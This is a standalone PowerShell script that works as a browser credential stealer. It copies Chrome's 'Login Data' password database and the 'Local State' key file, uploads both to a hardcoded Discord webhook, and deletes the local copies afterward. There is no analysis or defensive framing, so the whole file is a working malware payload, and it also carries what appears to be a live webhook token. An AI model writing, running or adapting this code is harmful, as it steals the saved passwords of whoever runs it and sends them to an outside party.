# Load required assembly for HttpClient
Add-Type -AssemblyName System.Net.Http

# Define the webhook URL
$hookurl = "https://discord.com/api/webhooks/1174869383433175091/zR2jc5lKRADG3hbIatlFUjnaMhZilNixBAabG8uxV-2FUmsJpWH79hjYBu8xGT00xe-m"

# Function to create and send a multipart request
function Send-MultipartRequest {
    param (
        [String]$filePath,
        [String]$message
    )

    $httpClient = New-Object System.Net.Http.HttpClient

    # Create multipart form data content
    $content = New-Object System.Net.Http.MultipartFormDataContent

    # JSON body as value of payload_json parameter
    $payload = @{
        content = $message
    } | ConvertTo-Json

    # Add payload_json part
    $stringContent = New-Object System.Net.Http.StringContent($payload)
    $content.Add($stringContent, "payload_json")

    # Add file part
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $streamContent = New-Object System.Net.Http.StreamContent($fileStream)
    $streamContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
    $content.Add($streamContent, "file", [System.IO.Path]::GetFileName($filePath))

    # Send request
    $response = $httpClient.PostAsync($hookurl, $content).Result
    $response.EnsureSuccessStatusCode()

    $fileStream.Dispose()
    $httpClient.Dispose()
}

# Define source and output file paths
$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$outputFile1 = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "output.txt"
Copy-Item $sourceFile1 $outputFile1 -ErrorAction SilentlyContinue

# Send multipart request for outputFile1
Send-MultipartRequest -filePath $outputFile1 -message ":)"

# Clean up outputFile1
Remove-Item $outputFile1 -ErrorAction SilentlyContinue

# Repeat the process for the second file
$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$outputFile2 = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "key.txt"
Copy-Item $sourceFile2 $outputFile2 -ErrorAction SilentlyContinue

# Send multipart request for outputFile2
Send-MultipartRequest -filePath $outputFile2 -message "Key-File"

# Clean up outputFile2
Remove-Item $outputFile2 -ErrorAction SilentlyContinue
